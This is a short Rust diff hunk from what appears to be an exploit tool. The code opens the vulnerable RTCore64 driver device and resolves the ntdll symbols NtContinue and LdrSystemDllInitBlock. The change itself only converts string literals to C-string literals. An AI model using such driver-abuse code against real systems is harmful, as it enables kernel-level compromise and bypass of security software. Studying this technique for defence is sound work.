@@ -20,11 +20,11 @@ fn main() {
     }
     eprintln!("[+] \\\\.\\RTCore64 opened");
 
-    let ntdll = unsafe { GetModuleHandleA("ntdll.dll\0".as_ptr()) };
-    let nt_continue = unsafe { GetProcAddress(ntdll, "NtContinue\0".as_ptr()) } as usize;
+    let ntdll = unsafe { GetModuleHandleA(c"ntdll.dll".as_ptr().cast::<u8>()) };
+    let nt_continue = unsafe { GetProcAddress(ntdll, c"NtContinue".as_ptr().cast::<u8>()) } as usize;
     eprintln!("[*] NtContinue = 0x{nt_continue:x}");
 
-    let init = unsafe { GetProcAddress(ntdll, "LdrSystemDllInitBlock\0".as_ptr()) } as usize;
+    let init = unsafe { GetProcAddress(ntdll, c"LdrSystemDllInitBlock".as_ptr().cast::<u8>()) } as usize;
     let sz = unsafe { *(init as *const u32) } as usize;
     eprintln!("[*] LdrSystemDllInitBlock size=0x{sz:x}");
 
